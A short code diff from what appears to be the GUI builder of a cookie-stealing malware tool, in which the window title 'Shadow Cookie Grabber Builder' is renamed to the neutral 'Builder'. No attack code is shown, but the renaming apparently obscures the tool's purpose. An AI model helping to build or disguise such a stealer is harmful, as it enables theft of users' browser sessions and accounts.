@@ -742,7 +742,7 @@ def create_builder_gui():
     file_type = "pyinstaller"
 
     root = customtkinter.CTk()
-    root.title("Shadow Cookie Grabber Builder")
+    root.title("Builder")
     root.geometry("800x550")
     root.configure(fg_color="#333333")
 
